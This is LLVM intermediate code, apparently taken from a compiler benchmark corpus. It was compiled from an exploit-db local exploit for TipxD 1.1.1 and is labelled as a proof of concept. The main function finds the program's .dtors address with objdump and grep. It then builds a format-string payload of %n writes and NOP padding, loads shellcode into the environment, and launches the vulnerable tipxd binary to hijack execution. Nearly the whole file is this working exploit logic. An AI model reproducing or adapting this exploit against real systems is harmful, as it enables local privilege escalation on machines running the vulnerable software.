; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_684.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_684.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@PATH = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [33 x i8] c"%s -s -j .dtors %s | %s ffffffff\00", align 1
@OBJDUMP = common dso_local global i8* null, align 8
@GREP = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c" %08x\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"Cannot find .dtors address\0A\00", align 1
@.str.4 = private unnamed_addr constant [51 x i8] c"\0A TipxD <= 1.1.1 local exploit (Proof of Concept)\0A\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c" by CoKi <coki@nosystem.com.ar>\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c" shellcode address = %.8p\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c" .dtors address = %.8p\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.10 = private unnamed_addr constant [63 x i8] c"%%08x%%08x%%08x%%08x%%08x%%08x%s\EB\02%%n%s\EB\02%%n%s\EB\02%%n%s\EB\02%%n\90\90\90\90\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"tipxd\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"-f\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [512 x i8], align 16
  %13 = alloca [1024 x i8], align 16
  %14 = alloca [255 x i8], align 16
  %15 = alloca [255 x i8], align 16
  %16 = alloca [255 x i8], align 16
  %17 = alloca [255 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca [3 x i8*], align 16
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = getelementptr inbounds [3 x i8*], [3 x i8*]* %23, i64 0, i64 0
  %26 = load i8*, i8** @shellcode, align 8
  store i8* %26, i8** %25, align 8
  %27 = getelementptr inbounds i8*, i8** %25, i64 1
  store i8* null, i8** %27, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = getelementptr inbounds i8*, i8** %25, i64 3
  br label %30

30:                                               ; preds = %30, %2
  %31 = phi i8** [ %28, %2 ], [ %32, %30 ]
  store i8* null, i8** %31, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = icmp eq i8** %32, %29
  br i1 %33, label %34, label %30

34:                                               ; preds = %30
  %35 = load i8*, i8** @shellcode, align 8
  %36 = call i32 @strlen(i8* %35)
  %37 = sub i32 -1073741830, %36
  %38 = load i8*, i8** @PATH, align 8
  %39 = call i32 @strlen(i8* %38)
  %40 = sub i32 %37, %39
  store i32 %40, i32* %24, align 4
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %42 = load i8*, i8** @OBJDUMP, align 8
  %43 = load i8*, i8** @PATH, align 8
  %44 = load i8*, i8** @GREP, align 8
  %45 = call i32 (i8*, i8*, ...) @sprintf(i8* %41, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i8* %42, i8* %43, i8* %44)
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %47 = call i32* @popen(i8* %46, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %47, i32** %22, align 8
  %48 = load i32*, i32** %22, align 8
  %49 = call i32 @fscanf(i32* %48, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32* %7)
  %50 = icmp ne i32 %49, 1
  br i1 %50, label %51, label %56

51:                                               ; preds = %34
  %52 = load i32*, i32** %22, align 8
  %53 = call i32 @pclose(i32* %52)
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %55 = call i32 @exit(i32 1) #3
  unreachable

56:                                               ; preds = %34
  %57 = load i32*, i32** %22, align 8
  %58 = call i32 @pclose(i32* %57)
  %59 = load i32, i32* %7, align 4
  %60 = add nsw i32 %59, 4
  store i32 %60, i32* %7, align 4
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.4, i64 0, i64 0))
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  %63 = load i32, i32* %24, align 4
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i32 %63)
  %65 = load i32, i32* %7, align 4
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i32 %65)
  %67 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %68 = call i32 @bzero(i8* %67, i32 512)
  %69 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %70 = call i32 @bzero(i8* %69, i32 1024)
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %72 = call i32 @strcat(i8* %71, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %73

73:                                               ; preds = %86, %56
  %74 = load i32, i32* %6, align 4
  %75 = icmp slt i32 %74, 4
  br i1 %75, label %76, label %89

76:                                               ; preds = %73
  %77 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %78 = call i32 @bzero(i8* %77, i32 512)
  %79 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %80 = call i32 (i8*, i8*, ...) @sprintf(i8* %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32* %7)
  %81 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %83 = call i32 @strncat(i8* %81, i8* %82, i32 4)
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %7, align 4
  br label %86

86:                                               ; preds = %76
  %87 = load i32, i32* %6, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %6, align 4
  br label %73

89:                                               ; preds = %73
  %90 = getelementptr inbounds [255 x i8], [255 x i8]* %14, i64 0, i64 0
  %91 = call i32 @memset(i8* %90, i8 signext 0, i32 255)
  %92 = getelementptr inbounds [255 x i8], [255 x i8]* %15, i64 0, i64 0
  %93 = call i32 @memset(i8* %92, i8 signext 0, i32 255)
  %94 = getelementptr inbounds [255 x i8], [255 x i8]* %16, i64 0, i64 0
  %95 = call i32 @memset(i8* %94, i8 signext 0, i32 255)
  %96 = getelementptr inbounds [255 x i8], [255 x i8]* %17, i64 0, i64 0
  %97 = call i32 @memset(i8* %96, i8 signext 0, i32 255)
  %98 = load i32, i32* %24, align 4
  %99 = and i32 %98, -16777216
  %100 = lshr i32 %99, 24
  store i32 %100, i32* %8, align 4
  %101 = load i32, i32* %24, align 4
  %102 = and i32 %101, 16711680
  %103 = ashr i32 %102, 16
  store i32 %103, i32* %9, align 4
  %104 = load i32, i32* %24, align 4
  %105 = and i32 %104, 65280
  %106 = ashr i32 %105, 8
  store i32 %106, i32* %10, align 4
  %107 = load i32, i32* %24, align 4
  %108 = and i32 %107, 255
  store i32 %108, i32* %11, align 4
  %109 = load i32, i32* %11, align 4
  %110 = sub i32 %109, 16
  %111 = sub i32 %110, 15
  %112 = sub i32 %111, 48
  %113 = sub i32 %112, 2
  %114 = sub i32 %113, 1
  store i32 %114, i32* %18, align 4
  %115 = load i32, i32* %18, align 4
  %116 = call i32 @check(i32 %115)
  store i32 %116, i32* %18, align 4
  %117 = load i32, i32* %10, align 4
  %118 = load i32, i32* %11, align 4
  %119 = sub i32 %117, %118
  %120 = sub i32 %119, 2
  store i32 %120, i32* %19, align 4
  %121 = load i32, i32* %19, align 4
  %122 = call i32 @check(i32 %121)
  store i32 %122, i32* %19, align 4
  %123 = load i32, i32* %9, align 4
  %124 = load i32, i32* %10, align 4
  %125 = sub i32 %123, %124
  %126 = sub i32 %125, 2
  store i32 %126, i32* %20, align 4
  %127 = load i32, i32* %20, align 4
  %128 = call i32 @check(i32 %127)
  store i32 %128, i32* %20, align 4
  %129 = load i32, i32* %8, align 4
  %130 = load i32, i32* %9, align 4
  %131 = sub i32 %129, %130
  %132 = sub i32 %131, 2
  store i32 %132, i32* %21, align 4
  %133 = load i32, i32* %21, align 4
  %134 = call i32 @check(i32 %133)
  store i32 %134, i32* %21, align 4
  %135 = getelementptr inbounds [255 x i8], [255 x i8]* %14, i64 0, i64 0
  %136 = load i32, i32* %18, align 4
  %137 = call i32 @memset(i8* %135, i8 signext -112, i32 %136)
  %138 = getelementptr inbounds [255 x i8], [255 x i8]* %15, i64 0, i64 0
  %139 = load i32, i32* %19, align 4
  %140 = call i32 @memset(i8* %138, i8 signext -112, i32 %139)
  %141 = getelementptr inbounds [255 x i8], [255 x i8]* %16, i64 0, i64 0
  %142 = load i32, i32* %20, align 4
  %143 = call i32 @memset(i8* %141, i8 signext -112, i32 %142)
  %144 = getelementptr inbounds [255 x i8], [255 x i8]* %17, i64 0, i64 0
  %145 = load i32, i32* %21, align 4
  %146 = call i32 @memset(i8* %144, i8 signext -112, i32 %145)
  %147 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %148 = getelementptr inbounds [255 x i8], [255 x i8]* %14, i64 0, i64 0
  %149 = getelementptr inbounds [255 x i8], [255 x i8]* %15, i64 0, i64 0
  %150 = getelementptr inbounds [255 x i8], [255 x i8]* %16, i64 0, i64 0
  %151 = getelementptr inbounds [255 x i8], [255 x i8]* %17, i64 0, i64 0
  %152 = call i32 (i8*, i8*, ...) @sprintf(i8* %147, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.10, i64 0, i64 0), i8* %148, i8* %149, i8* %150, i8* %151)
  %153 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %154 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %155 = call i32 @strcat(i8* %153, i8* %154)
  %156 = load i8*, i8** @PATH, align 8
  %157 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %158 = getelementptr inbounds [3 x i8*], [3 x i8*]* %23, i64 0, i64 0
  %159 = call i32 @execle(i8* %156, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %157, i32* null, i8** %158)
  %160 = load i32, i32* %3, align 4
  ret i32 %160
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32* @popen(i8*, i8*) #1

declare dso_local i32 @fscanf(i32*, i8*, i32*) #1

declare dso_local i32 @pclose(i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @check(i32) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32*, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
